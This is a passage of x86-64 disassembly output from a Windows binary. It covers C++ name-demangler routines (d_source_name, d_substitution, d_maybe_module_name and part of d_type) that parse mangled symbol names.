   140002a7d:	e9 13 ff ff ff       	jmp    140002995 <d_print_lambda_parm_name+0x165>
   140002a82:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002a88:	e8 43 d2 00 00       	call   14000fcd0 <__chk_fail>
   140002a8d:	e8 8e d2 00 00       	call   14000fd20 <__stack_chk_fail>
   140002a92:	90                   	nop
   140002a93:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002a9a:	00 00 00 00 
   140002a9e:	66 90                	xchg   %ax,%ax

0000000140002aa0 <d_source_name>:
   140002aa0:	53                   	push   %rbx
   140002aa1:	48 83 ec 20          	sub    $0x20,%rsp
   140002aa5:	48 89 cb             	mov    %rcx,%rbx
   140002aa8:	e8 b3 f3 ff ff       	call   140001e60 <d_number>
   140002aad:	41 89 c0             	mov    %eax,%r8d
   140002ab0:	31 c0                	xor    %eax,%eax
   140002ab2:	45 85 c0             	test   %r8d,%r8d
   140002ab5:	7e 75                	jle    140002b2c <d_source_name+0x8c>
   140002ab7:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002abb:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002abf:	49 63 c0             	movslq %r8d,%rax
   140002ac2:	48 29 d1             	sub    %rdx,%rcx
   140002ac5:	48 39 c1             	cmp    %rax,%rcx
   140002ac8:	0f 8c 82 00 00 00    	jl     140002b50 <d_source_name+0xb0>
   140002ace:	48 01 d0             	add    %rdx,%rax
   140002ad1:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002ad5:	f6 43 10 04          	testb  $0x4,0x10(%rbx)
   140002ad9:	74 05                	je     140002ae0 <d_source_name+0x40>
   140002adb:	80 38 24             	cmpb   $0x24,(%rax)
   140002ade:	74 58                	je     140002b38 <d_source_name+0x98>
   140002ae0:	41 83 f8 09          	cmp    $0x9,%r8d
   140002ae4:	7e 3a                	jle    140002b20 <d_source_name+0x80>
   140002ae6:	48 b8 5f 47 4c 4f 42 	movabs $0x5f4c41424f4c475f,%rax
   140002aed:	41 4c 5f 
   140002af0:	48 39 02             	cmp    %rax,(%rdx)
   140002af3:	75 2b                	jne    140002b20 <d_source_name+0x80>
   140002af5:	0f b6 42 08          	movzbl 0x8(%rdx),%eax
   140002af9:	83 e8 24             	sub    $0x24,%eax
   140002afc:	3c 3b                	cmp    $0x3b,%al
   140002afe:	77 20                	ja     140002b20 <d_source_name+0x80>
   140002b00:	48 b9 01 04 00 00 00 	movabs $0x800000000000401,%rcx
   140002b07:	00 00 08 
   140002b0a:	48 0f a3 c1          	bt     %rax,%rcx
   140002b0e:	73 10                	jae    140002b20 <d_source_name+0x80>
   140002b10:	80 7a 09 4e          	cmpb   $0x4e,0x9(%rdx)
   140002b14:	74 42                	je     140002b58 <d_source_name+0xb8>
   140002b16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002b1d:	00 00 00 
   140002b20:	48 89 d9             	mov    %rbx,%rcx
   140002b23:	e8 d8 f2 ff ff       	call   140001e00 <d_make_name>
   140002b28:	48 89 43 40          	mov    %rax,0x40(%rbx)
   140002b2c:	48 83 c4 20          	add    $0x20,%rsp
   140002b30:	5b                   	pop    %rbx
   140002b31:	c3                   	ret
   140002b32:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002b38:	48 83 c0 01          	add    $0x1,%rax
   140002b3c:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002b40:	41 83 f8 09          	cmp    $0x9,%r8d
   140002b44:	7f a0                	jg     140002ae6 <d_source_name+0x46>
   140002b46:	eb d8                	jmp    140002b20 <d_source_name+0x80>
   140002b48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002b4f:	00 
   140002b50:	31 c0                	xor    %eax,%eax
   140002b52:	eb d4                	jmp    140002b28 <d_source_name+0x88>
   140002b54:	0f 1f 40 00          	nopl   0x0(%rax)
   140002b58:	8b 43 48             	mov    0x48(%rbx),%eax
   140002b5b:	8b 53 28             	mov    0x28(%rbx),%edx
   140002b5e:	83 c0 16             	add    $0x16,%eax
   140002b61:	44 29 c0             	sub    %r8d,%eax
   140002b64:	89 43 48             	mov    %eax,0x48(%rbx)
   140002b67:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   140002b6a:	7d e4                	jge    140002b50 <d_source_name+0xb0>
   140002b6c:	48 63 c2             	movslq %edx,%rax
   140002b6f:	83 c2 01             	add    $0x1,%edx
   140002b72:	89 53 28             	mov    %edx,0x28(%rbx)
   140002b75:	48 c1 e0 05          	shl    $0x5,%rax
   140002b79:	48 8d 15 49 e9 34 00 	lea    0x34e949(%rip),%rdx        # 1403514c9 <.rdata+0xc9>
   140002b80:	48 03 43 20          	add    0x20(%rbx),%rax
   140002b84:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140002b8b:	00 
   140002b8c:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140002b92:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140002b96:	c7 40 18 15 00 00 00 	movl   $0x15,0x18(%rax)
   140002b9d:	eb 89                	jmp    140002b28 <d_source_name+0x88>
   140002b9f:	90                   	nop

0000000140002ba0 <d_substitution>:
   140002ba0:	57                   	push   %rdi
   140002ba1:	56                   	push   %rsi
   140002ba2:	53                   	push   %rbx
   140002ba3:	48 83 ec 20          	sub    $0x20,%rsp
   140002ba7:	48 89 cb             	mov    %rcx,%rbx
   140002baa:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140002bae:	80 39 53             	cmpb   $0x53,(%rcx)
   140002bb1:	75 76                	jne    140002c29 <d_substitution+0x89>
   140002bb3:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140002bb7:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002bbb:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140002bbf:	84 c0                	test   %al,%al
   140002bc1:	74 7d                	je     140002c40 <d_substitution+0xa0>
   140002bc3:	48 8d 41 02          	lea    0x2(%rcx),%rax
   140002bc7:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002bcb:	0f be 41 01          	movsbl 0x1(%rcx),%eax
   140002bcf:	8d 48 d0             	lea    -0x30(%rax),%ecx
   140002bd2:	80 f9 2f             	cmp    $0x2f,%cl
   140002bd5:	77 69                	ja     140002c40 <d_substitution+0xa0>
   140002bd7:	49 b8 ff 03 fe ff ff 	movabs $0x87fffffe03ff,%r8
   140002bde:	87 00 00 
   140002be1:	49 0f a3 c8          	bt     %rcx,%r8
   140002be5:	73 59                	jae    140002c40 <d_substitution+0xa0>
   140002be7:	31 d2                	xor    %edx,%edx
   140002be9:	3c 5f                	cmp    $0x5f,%al
   140002beb:	75 20                	jne    140002c0d <d_substitution+0x6d>
   140002bed:	e9 ae 00 00 00       	jmp    140002ca0 <d_substitution+0x100>
   140002bf2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002bf8:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140002bfc:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002c00:	0f be 00             	movsbl (%rax),%eax
   140002c03:	3c 5f                	cmp    $0x5f,%al
   140002c05:	0f 84 b5 01 00 00    	je     140002dc0 <d_substitution+0x220>
   140002c0b:	89 ca                	mov    %ecx,%edx
   140002c0d:	8d 48 d0             	lea    -0x30(%rax),%ecx
   140002c10:	80 f9 09             	cmp    $0x9,%cl
   140002c13:	77 6b                	ja     140002c80 <d_substitution+0xe0>
   140002c15:	8d 0c d2             	lea    (%rdx,%rdx,8),%ecx
   140002c18:	8d 4c 88 d0          	lea    -0x30(%rax,%rcx,4),%ecx
   140002c1c:	39 d1                	cmp    %edx,%ecx
   140002c1e:	72 09                	jb     140002c29 <d_substitution+0x89>
   140002c20:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002c24:	80 38 00             	cmpb   $0x0,(%rax)
   140002c27:	75 cf                	jne    140002bf8 <d_substitution+0x58>
   140002c29:	31 f6                	xor    %esi,%esi
   140002c2b:	48 89 f0             	mov    %rsi,%rax
   140002c2e:	48 83 c4 20          	add    $0x20,%rsp
   140002c32:	5b                   	pop    %rbx
   140002c33:	5e                   	pop    %rsi
   140002c34:	5f                   	pop    %rdi
   140002c35:	c3                   	ret
   140002c36:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002c3d:	00 00 00 
   140002c40:	8b 4b 10             	mov    0x10(%rbx),%ecx
   140002c43:	83 e1 08             	and    $0x8,%ecx
   140002c46:	75 50                	jne    140002c98 <d_substitution+0xf8>
   140002c48:	83 e2 01             	and    $0x1,%edx
   140002c4b:	74 4b                	je     140002c98 <d_substitution+0xf8>
   140002c4d:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002c51:	0f b6 12             	movzbl (%rdx),%edx
   140002c54:	83 ea 43             	sub    $0x43,%edx
   140002c57:	80 fa 01             	cmp    $0x1,%dl
   140002c5a:	0f 96 c1             	setbe  %cl
   140002c5d:	48 8d 15 bc f2 34 00 	lea    0x34f2bc(%rip),%rdx        # 140351f20 <standard_subs>
   140002c64:	4c 8d 82 88 01 00 00 	lea    0x188(%rdx),%r8
   140002c6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c70:	38 02                	cmp    %al,(%rdx)
   140002c72:	74 4c                	je     140002cc0 <d_substitution+0x120>
   140002c74:	48 83 c2 38          	add    $0x38,%rdx
   140002c78:	4c 39 c2             	cmp    %r8,%rdx
   140002c7b:	75 f3                	jne    140002c70 <d_substitution+0xd0>
   140002c7d:	eb aa                	jmp    140002c29 <d_substitution+0x89>
   140002c7f:	90                   	nop
   140002c80:	8d 48 bf             	lea    -0x41(%rax),%ecx
   140002c83:	80 f9 19             	cmp    $0x19,%cl
   140002c86:	77 a1                	ja     140002c29 <d_substitution+0x89>
   140002c88:	8d 0c d2             	lea    (%rdx,%rdx,8),%ecx
   140002c8b:	8d 4c 88 c9          	lea    -0x37(%rax,%rcx,4),%ecx
   140002c8f:	eb 8b                	jmp    140002c1c <d_substitution+0x7c>
   140002c91:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002c98:	c1 e9 03             	shr    $0x3,%ecx
   140002c9b:	83 e1 01             	and    $0x1,%ecx
   140002c9e:	eb bd                	jmp    140002c5d <d_substitution+0xbd>
   140002ca0:	31 c9                	xor    %ecx,%ecx
   140002ca2:	3b 4b 38             	cmp    0x38(%rbx),%ecx
   140002ca5:	73 82                	jae    140002c29 <d_substitution+0x89>
   140002ca7:	48 8b 43 30          	mov    0x30(%rbx),%rax
   140002cab:	48 8b 34 c8          	mov    (%rax,%rcx,8),%rsi
   140002caf:	48 89 f0             	mov    %rsi,%rax
   140002cb2:	48 83 c4 20          	add    $0x20,%rsp
   140002cb6:	5b                   	pop    %rbx
   140002cb7:	5e                   	pop    %rsi
   140002cb8:	5f                   	pop    %rdi
   140002cb9:	c3                   	ret
   140002cba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002cc0:	4c 8b 52 28          	mov    0x28(%rdx),%r10
   140002cc4:	8b 43 28             	mov    0x28(%rbx),%eax
   140002cc7:	44 8b 4b 2c          	mov    0x2c(%rbx),%r9d
   140002ccb:	4d 85 d2             	test   %r10,%r10
   140002cce:	74 39                	je     140002d09 <d_substitution+0x169>
   140002cd0:	44 8b 5a 30          	mov    0x30(%rdx),%r11d
   140002cd4:	41 39 c1             	cmp    %eax,%r9d
   140002cd7:	0f 8e ff 00 00 00    	jle    140002ddc <d_substitution+0x23c>
   140002cdd:	4c 63 c0             	movslq %eax,%r8
   140002ce0:	83 c0 01             	add    $0x1,%eax
   140002ce3:	49 c1 e0 05          	shl    $0x5,%r8
   140002ce7:	4c 03 43 20          	add    0x20(%rbx),%r8
   140002ceb:	49 c7 40 04 00 00 00 	movq   $0x0,0x4(%r8)
   140002cf2:	00 
   140002cf3:	89 43 28             	mov    %eax,0x28(%rbx)
   140002cf6:	41 c7 00 18 00 00 00 	movl   $0x18,(%r8)
   140002cfd:	4d 89 50 10          	mov    %r10,0x10(%r8)
   140002d01:	45 89 58 18          	mov    %r11d,0x18(%r8)
   140002d05:	4c 89 43 40          	mov    %r8,0x40(%rbx)
   140002d09:	84 c9                	test   %cl,%cl
   140002d0b:	0f 85 bf 00 00 00    	jne    140002dd0 <d_substitution+0x230>
   140002d11:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   140002d15:	8b 52 10             	mov    0x10(%rdx),%edx
   140002d18:	01 53 48             	add    %edx,0x48(%rbx)
   140002d1b:	41 39 c1             	cmp    %eax,%r9d
   140002d1e:	0f 8e c0 00 00 00    	jle    140002de4 <d_substitution+0x244>
   140002d24:	48 63 f0             	movslq %eax,%rsi
   140002d27:	83 c0 01             	add    $0x1,%eax
   140002d2a:	48 c1 e6 05          	shl    $0x5,%rsi
   140002d2e:	48 03 73 20          	add    0x20(%rbx),%rsi
   140002d32:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140002d39:	00 
   140002d3a:	89 43 28             	mov    %eax,0x28(%rbx)
   140002d3d:	c7 06 18 00 00 00    	movl   $0x18,(%rsi)
   140002d43:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
   140002d47:	89 56 18             	mov    %edx,0x18(%rsi)
   140002d4a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002d4e:	80 38 42             	cmpb   $0x42,(%rax)
   140002d51:	0f 85 d4 fe ff ff    	jne    140002c2b <d_substitution+0x8b>
   140002d57:	48 8b 7b 40          	mov    0x40(%rbx),%rdi
   140002d5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d60:	48 83 c0 01          	add    $0x1,%rax
   140002d64:	48 89 d9             	mov    %rbx,%rcx
   140002d67:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002d6b:	e8 30 fd ff ff       	call   140002aa0 <d_source_name>
   140002d70:	49 89 f0             	mov    %rsi,%r8
   140002d73:	ba 4e 00 00 00       	mov    $0x4e,%edx
   140002d78:	48 89 d9             	mov    %rbx,%rcx
   140002d7b:	49 89 c1             	mov    %rax,%r9
   140002d7e:	e8 7d ef ff ff       	call   140001d00 <d_make_comp>
   140002d83:	48 89 c6             	mov    %rax,%rsi
   140002d86:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002d8a:	80 38 42             	cmpb   $0x42,(%rax)
   140002d8d:	74 d1                	je     140002d60 <d_substitution+0x1c0>
   140002d8f:	48 89 7b 40          	mov    %rdi,0x40(%rbx)
   140002d93:	48 85 f6             	test   %rsi,%rsi
   140002d96:	0f 84 8d fe ff ff    	je     140002c29 <d_substitution+0x89>
   140002d9c:	8b 43 38             	mov    0x38(%rbx),%eax
   140002d9f:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   140002da2:	0f 8d 81 fe ff ff    	jge    140002c29 <d_substitution+0x89>
   140002da8:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140002dac:	48 63 c8             	movslq %eax,%rcx
   140002daf:	83 c0 01             	add    $0x1,%eax
   140002db2:	48 89 34 ca          	mov    %rsi,(%rdx,%rcx,8)
   140002db6:	89 43 38             	mov    %eax,0x38(%rbx)
   140002db9:	e9 6d fe ff ff       	jmp    140002c2b <d_substitution+0x8b>
   140002dbe:	66 90                	xchg   %ax,%ax
   140002dc0:	83 c1 01             	add    $0x1,%ecx
   140002dc3:	e9 da fe ff ff       	jmp    140002ca2 <d_substitution+0x102>
   140002dc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002dcf:	00 
   140002dd0:	48 8b 4a 18          	mov    0x18(%rdx),%rcx
   140002dd4:	8b 52 20             	mov    0x20(%rdx),%edx
   140002dd7:	e9 3c ff ff ff       	jmp    140002d18 <d_substitution+0x178>
   140002ddc:	45 31 c0             	xor    %r8d,%r8d
   140002ddf:	e9 21 ff ff ff       	jmp    140002d05 <d_substitution+0x165>
   140002de4:	31 f6                	xor    %esi,%esi
   140002de6:	e9 5f ff ff ff       	jmp    140002d4a <d_substitution+0x1aa>
   140002deb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000140002df0 <d_maybe_module_name>:
   140002df0:	57                   	push   %rdi
   140002df1:	56                   	push   %rsi
   140002df2:	53                   	push   %rbx
   140002df3:	48 83 ec 20          	sub    $0x20,%rsp
   140002df7:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140002dfb:	80 38 57             	cmpb   $0x57,(%rax)
   140002dfe:	48 89 cb             	mov    %rcx,%rbx
   140002e01:	48 89 d6             	mov    %rdx,%rsi
   140002e04:	74 24                	je     140002e2a <d_maybe_module_name+0x3a>
   140002e06:	eb 78                	jmp    140002e80 <d_maybe_module_name+0x90>
   140002e08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002e0f:	00 
   140002e10:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140002e14:	4c 63 c2             	movslq %edx,%r8
   140002e17:	83 c2 01             	add    $0x1,%edx
   140002e1a:	4a 89 04 c1          	mov    %rax,(%rcx,%r8,8)
   140002e1e:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002e22:	89 53 38             	mov    %edx,0x38(%rbx)
   140002e25:	80 38 57             	cmpb   $0x57,(%rax)
   140002e28:	75 56                	jne    140002e80 <d_maybe_module_name+0x90>
   140002e2a:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140002e2e:	bf 55 00 00 00       	mov    $0x55,%edi
   140002e33:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002e37:	80 78 01 50          	cmpb   $0x50,0x1(%rax)
   140002e3b:	75 0d                	jne    140002e4a <d_maybe_module_name+0x5a>
   140002e3d:	48 83 c0 02          	add    $0x2,%rax
   140002e41:	bf 56 00 00 00       	mov    $0x56,%edi
   140002e46:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002e4a:	48 89 d9             	mov    %rbx,%rcx
   140002e4d:	e8 4e fc ff ff       	call   140002aa0 <d_source_name>
   140002e52:	4c 8b 06             	mov    (%rsi),%r8
   140002e55:	89 fa                	mov    %edi,%edx
   140002e57:	48 89 d9             	mov    %rbx,%rcx
   140002e5a:	49 89 c1             	mov    %rax,%r9
   140002e5d:	e8 9e ee ff ff       	call   140001d00 <d_make_comp>
   140002e62:	48 89 06             	mov    %rax,(%rsi)
   140002e65:	48 85 c0             	test   %rax,%rax
   140002e68:	74 08                	je     140002e72 <d_maybe_module_name+0x82>
   140002e6a:	8b 53 38             	mov    0x38(%rbx),%edx
   140002e6d:	3b 53 3c             	cmp    0x3c(%rbx),%edx
   140002e70:	7c 9e                	jl     140002e10 <d_maybe_module_name+0x20>
   140002e72:	31 c0                	xor    %eax,%eax
   140002e74:	48 83 c4 20          	add    $0x20,%rsp
   140002e78:	5b                   	pop    %rbx
   140002e79:	5e                   	pop    %rsi
   140002e7a:	5f                   	pop    %rdi
   140002e7b:	c3                   	ret
   140002e7c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002e80:	b8 01 00 00 00       	mov    $0x1,%eax
   140002e85:	48 83 c4 20          	add    $0x20,%rsp
   140002e89:	5b                   	pop    %rbx
   140002e8a:	5e                   	pop    %rsi
   140002e8b:	5f                   	pop    %rdi
   140002e8c:	c3                   	ret
   140002e8d:	0f 1f 00             	nopl   (%rax)

0000000140002e90 <d_type>:
   140002e90:	41 56                	push   %r14
   140002e92:	41 55                	push   %r13
   140002e94:	41 54                	push   %r12
   140002e96:	55                   	push   %rbp
   140002e97:	57                   	push   %rdi
   140002e98:	56                   	push   %rsi
   140002e99:	53                   	push   %rbx
   140002e9a:	48 83 ec 40          	sub    $0x40,%rsp
   140002e9e:	48 8b 35 cb 0d 35 00 	mov    0x350dcb(%rip),%rsi        # 140353c70 <.refptr.__stack_chk_guard>
   140002ea5:	4c 8b 06             	mov    (%rsi),%r8
   140002ea8:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140002ead:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140002eb1:	48 89 cb             	mov    %rcx,%rbx
   140002eb4:	4c 89 c1             	mov    %r8,%rcx
   140002eb7:	e8 a4 f4 ff ff       	call   140002360 <next_is_type_qual.isra.0>
   140002ebc:	85 c0                	test   %eax,%eax
   140002ebe:	75 38                	jne    140002ef8 <d_type+0x68>
   140002ec0:	41 0f be 00          	movsbl (%r8),%eax
   140002ec4:	3c 54                	cmp    $0x54,%al
   140002ec6:	0f 8f 3c 01 00 00    	jg     140003008 <d_type+0x178>
   140002ecc:	3c 40                	cmp    $0x40,%al
   140002ece:	0f 8e cc 01 00 00    	jle    1400030a0 <d_type+0x210>
   140002ed4:	83 e8 41             	sub    $0x41,%eax
   140002ed7:	3c 13                	cmp    $0x13,%al
   140002ed9:	0f 87 c1 01 00 00    	ja     1400030a0 <d_type+0x210>
   140002edf:	48 8d 15 0e e6 34 00 	lea    0x34e60e(%rip),%rdx        # 1403514f4 <.rdata+0xf4>
   140002ee6:	0f b6 c0             	movzbl %al,%eax
   140002ee9:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140002eed:	48 01 d0             	add    %rdx,%rax
   140002ef0:	ff e0                	jmp    *%rax
   140002ef2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002ef8:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002efd:	45 31 c0             	xor    %r8d,%r8d
   140002f00:	48 89 d9             	mov    %rbx,%rcx
   140002f03:	e8 88 23 00 00       	call   140005290 <d_cv_qualifiers>
   140002f08:	48 89 c7             	mov    %rax,%rdi
   140002f0b:	48 85 c0             	test   %rax,%rax
   140002f0e:	0f 84 bc 00 00 00    	je     140002fd0 <d_type+0x140>
   140002f14:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002f18:	48 89 d9             	mov    %rbx,%rcx
   140002f1b:	80 38 46             	cmpb   $0x46,(%rax)
   140002f1e:	0f 84 d4 00 00 00    	je     140002ff8 <d_type+0x168>
   140002f24:	e8 67 ff ff ff       	call   140002e90 <d_type>
   140002f29:	48 89 07             	mov    %rax,(%rdi)
   140002f2c:	48 85 c0             	test   %rax,%rax
   140002f2f:	0f 84 9b 00 00 00    	je     140002fd0 <d_type+0x140>
   140002f35:	8b 10                	mov    (%rax),%edx
   140002f37:	83 ea 1f             	sub    $0x1f,%edx
   140002f3a:	83 fa 01             	cmp    $0x1,%edx
   140002f3d:	77 18                	ja     140002f57 <d_type+0xc7>
   140002f3f:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002f44:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140002f48:	48 89 48 10          	mov    %rcx,0x10(%rax)
   140002f4c:	48 8b 07             	mov    (%rdi),%rax
   140002f4f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f54:	48 89 17             	mov    %rdx,(%rdi)
   140002f57:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140002f5c:	48 85 ff             	test   %rdi,%rdi
   140002f5f:	74 6f                	je     140002fd0 <d_type+0x140>
   140002f61:	8b 43 38             	mov    0x38(%rbx),%eax
   140002f64:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   140002f67:	7d 67                	jge    140002fd0 <d_type+0x140>
   140002f69:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140002f6d:	48 63 c8             	movslq %eax,%rcx
   140002f70:	83 c0 01             	add    $0x1,%eax
   140002f73:	48 89 3c ca          	mov    %rdi,(%rdx,%rcx,8)
   140002f77:	89 43 38             	mov    %eax,0x38(%rbx)
   140002f7a:	eb 56                	jmp    140002fd2 <d_type+0x142>
   140002f7c:	8b 7b 4c             	mov    0x4c(%rbx),%edi
   140002f7f:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   140002f86:	48 89 d9             	mov    %rbx,%rcx
   140002f89:	e8 32 1b 00 00       	call   140004ac0 <d_expression_1>
   140002f8e:	89 7b 4c             	mov    %edi,0x4c(%rbx)
   140002f91:	45 31 c9             	xor    %r9d,%r9d
   140002f94:	ba 45 00 00 00       	mov    $0x45,%edx
   140002f99:	49 89 c0             	mov    %rax,%r8
   140002f9c:	48 89 d9             	mov    %rbx,%rcx
   140002f9f:	e8 5c ed ff ff       	call   140001d00 <d_make_comp>
   140002fa4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002fa9:	48 89 c7             	mov    %rax,%rdi
   140002fac:	48 85 c0             	test   %rax,%rax
   140002faf:	74 1f                	je     140002fd0 <d_type+0x140>
   140002fb1:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002fb5:	80 38 00             	cmpb   $0x0,(%rax)
   140002fb8:	74 16                	je     140002fd0 <d_type+0x140>
   140002fba:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140002fbe:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002fc2:	80 38 45             	cmpb   $0x45,(%rax)
   140002fc5:	0f 84 ae 00 00 00    	je     140003079 <d_type+0x1e9>
   140002fcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002fd0:	31 ff                	xor    %edi,%edi
   140002fd2:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140002fd7:	48 2b 06             	sub    (%rsi),%rax
   140002fda:	0f 85 9c 09 00 00    	jne    14000397c <d_type+0xaec>
   140002fe0:	48 89 f8             	mov    %rdi,%rax
   140002fe3:	48 83 c4 40          	add    $0x40,%rsp
   140002fe7:	5b                   	pop    %rbx
   140002fe8:	5e                   	pop    %rsi
   140002fe9:	5f                   	pop    %rdi
   140002fea:	5d                   	pop    %rbp
   140002feb:	41 5c                	pop    %r12
   140002fed:	41 5d                	pop    %r13
   140002fef:	41 5e                	pop    %r14
   140002ff1:	c3                   	ret
   140002ff2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002ff8:	e8 33 0b 00 00       	call   140003b30 <d_function_type>
   140002ffd:	e9 27 ff ff ff       	jmp    140002f29 <d_type+0x99>
   140003002:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003008:	8d 48 ab             	lea    -0x55(%rax),%ecx
   14000300b:	80 f9 25             	cmp    $0x25,%cl
   14000300e:	0f 87 8c 00 00 00    	ja     1400030a0 <d_type+0x210>
   140003014:	49 b9 00 f0 bf c7 3e 	movabs $0x3ec7bff000,%r9
   14000301b:	00 00 00 
   14000301e:	ba 01 00 00 00       	mov    $0x1,%edx
   140003023:	48 d3 e2             	shl    %cl,%rdx
   140003026:	4c 85 ca             	test   %r9,%rdx
   140003029:	0f 85 b1 07 00 00    	jne    1400037e0 <d_type+0x950>
   14000302f:	83 e2 01             	and    $0x1,%edx
   140003032:	0f 85 58 07 00 00    	jne    140003790 <d_type+0x900>
   140003038:	80 f9 20             	cmp    $0x20,%cl
   14000303b:	75 63                	jne    1400030a0 <d_type+0x210>
   14000303d:	49 83 c0 01          	add    $0x1,%r8
   140003041:	48 89 d9             	mov    %rbx,%rcx
   140003044:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140003048:	e8 53 fa ff ff       	call   140002aa0 <d_source_name>
   14000304d:	45 31 c9             	xor    %r9d,%r9d
   140003050:	ba 29 00 00 00       	mov    $0x29,%edx
   140003055:	48 89 d9             	mov    %rbx,%rcx
   140003058:	49 89 c0             	mov    %rax,%r8
   14000305b:	e8 a0 ec ff ff       	call   140001d00 <d_make_comp>
   140003060:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003065:	48 89 c7             	mov    %rax,%rdi
   140003068:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000306f:	00 
   140003070:	48 85 ff             	test   %rdi,%rdi
   140003073:	0f 84 57 ff ff ff    	je     140002fd0 <d_type+0x140>
   140003079:	8b 43 38             	mov    0x38(%rbx),%eax
   14000307c:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   14000307f:	0f 8d 4b ff ff ff    	jge    140002fd0 <d_type+0x140>
   140003085:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140003089:	48 63 c8             	movslq %eax,%rcx
   14000308c:	83 c0 01             	add    $0x1,%eax
   14000308f:	48 89 3c ca          	mov    %rdi,(%rdx,%rcx,8)
   140003093:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140003098:	89 43 38             	mov    %eax,0x38(%rbx)
   14000309b:	e9 32 ff ff ff       	jmp    140002fd2 <d_type+0x142>
   1400030a0:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400030a5:	48 2b 06             	sub    (%rsi),%rax
   1400030a8:	0f 85 ce 08 00 00    	jne    14000397c <d_type+0xaec>
   1400030ae:	ba 01 00 00 00       	mov    $0x1,%edx
   1400030b3:	48 89 d9             	mov    %rbx,%rcx
   1400030b6:	48 83 c4 40          	add    $0x40,%rsp
   1400030ba:	5b                   	pop    %rbx
   1400030bb:	5e                   	pop    %rsi
   1400030bc:	5f                   	pop    %rdi
   1400030bd:	5d                   	pop    %rbp
   1400030be:	41 5c                	pop    %r12
   1400030c0:	41 5d                	pop    %r13
   1400030c2:	41 5e                	pop    %r14
   1400030c4:	e9 57 2c 00 00       	jmp    140005d20 <d_name>
   1400030c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400030d0:	49 83 c0 01          	add    $0x1,%r8
   1400030d4:	48 89 d9             	mov    %rbx,%rcx
   1400030d7:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   1400030db:	e8 b0 fd ff ff       	call   140002e90 <d_type>
   1400030e0:	45 31 c9             	xor    %r9d,%r9d
   1400030e3:	ba 26 00 00 00       	mov    $0x26,%edx
   1400030e8:	48 89 d9             	mov    %rbx,%rcx
